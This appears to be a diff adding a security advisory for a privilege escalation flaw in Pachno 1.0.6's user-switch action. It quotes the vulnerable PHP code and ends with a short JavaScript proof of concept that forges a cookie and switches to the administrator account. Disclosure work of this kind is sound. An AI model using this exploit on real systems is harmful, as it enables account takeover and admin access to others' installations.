@@ -1,0 +1,105 @@
+
+Pachno 1.0.6 (runSwitchUser()) Remote Vertical Privilege Escalation
+
+
+Vendor: Daniel André Eikeland
+Product web page: https://github.com/pachno/pachno
+Affected version: 1.0.6
+
+Summary: Pachno is an open-source collaboration platform (formerly known as The Bug
+Genie) designed for team project management, issue tracking, and documentation. It
+offers a module-based, customizable environment for software development and team
+workflows, distributed under the Mozilla Public License.
+
+Desc: The authorization check in the runSwitchUser() action evaluates the expression
+!canSaveConfiguration() && !hasCookie('original_username') and only forbids the request
+when both subexpressions are true. The presence of the original_username cookie is
+sufficient to satisfy the second condition, and that cookie is fully client-controlled.
+An authenticated low-privilege user who sets original_username to any value and then
+issues a request to switch to user ID 1 receives a fresh session token (token authentication)
+or password hash cookie (password authentication) belonging to the target user. This
+can be exploited to elevate privileges to administrator and impersonate arbitrary user
+accounts.
+
+=====================================================================================
+/core/modules/auth/controllers/Authentication.php:
+--------------------------------------------------
+        /**
+         * Switch user action
+         *
+         * @Route(name="switch_to_user", url="/userswitch/switch/:user_id/:csrf_token")
+         * @CsrfProtected
+         *
+         * @param framework\Request $request
+         */
+        public function runSwitchUser(framework\Request $request)
+        {
+            if (!$this->getUser()->canSaveConfiguration() && !$request->hasCookie('original_username'))
+                return $this->forward403();
+
+            $response = $this->getResponse();
+            $authentication_backend = framework\Settings::getAuthenticationBackend();
+            if ($request['user_id']) {
+                $user = new entities\User($request['user_id']);
+                if ($authentication_backend->getAuthenticationMethod() == framework\AuthenticationBackend::AUTHENTICATION_TYPE_TOKEN) {
+                    $response->setCookie('original_username', $request->getCookie('username'));
+                    $response->setCookie('original_session_token', $request->getCookie('session_token'));
+                    framework\Context::getResponse()->setCookie('username', $user->getUsername());
+                    framework\Context::getResponse()->setCookie('session_token', $user->createUserSession()->getToken());
+                } else {
+                    $response->setCookie('original_username', $request->getCookie('username'));
+                    $response->setCookie('original_password', $request->getCookie('password'));
+                    framework\Context::getResponse()->setCookie('password', $user->getHashPassword());
+                    framework\Context::getResponse()->setCookie('username', $user->getUsername());
+                }
+            } else {
+                if ($authentication_backend->getAuthenticationMethod() == framework\AuthenticationBackend::AUTHENTICATION_TYPE_TOKEN) {
+                    $response->setCookie('username', $request->getCookie('original_username'));
+                    $response->setCookie('session_token', $request->getCookie('original_session_token'));
+                    framework\Context::getResponse()->deleteCookie('original_session_token');
+                    framework\Context::getResponse()->deleteCookie('original_username');
+                } else {
+                    $response->setCookie('username', $request->getCookie('original_username'));
+                    $response->setCookie('password', $request->getCookie('original_password'));
+                    framework\Context::getResponse()->deleteCookie('original_password');
+                    framework\Context::getResponse()->deleteCookie('original_username');
+                }
+            }
+            $this->forward($this->getRouting()->generate('home'));
+        }
+=====================================================================================
+
+Tested on: GNU/Linux
+           Apache2
+           PHP/7.4
+           MySQL/5.7 (MariaDB)
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2026-5985
+Advisory URL: https://www.zeroscience.mk/#/advisories/ZSL-2026-5985
+
+
+06.04.2026
+
+--
+
+
+document.cookie = "original_username=liquidworm; path=/";
+
+const csrf = document.querySelector('input[name="csrf_token"]')?.value
+          || document.querySelector('meta[name="csrf-token"]')?.content;
+
+fetch('/switch_user', {
+    method: 'POST',
+    credentials: 'include',
+    headers: { 'Content-Type': 'application/x-www-form-urlencoded',
+               'User-Agent'  : 'AuthorizationBypassium/1.12.04' },
+    body: `user_id=1&csrf_token=${encodeURIComponent(csrf)}`
+}).then(() => {
+    window.location.href = '/configure';
+});
+// If you 'see' /configure, you are admin.
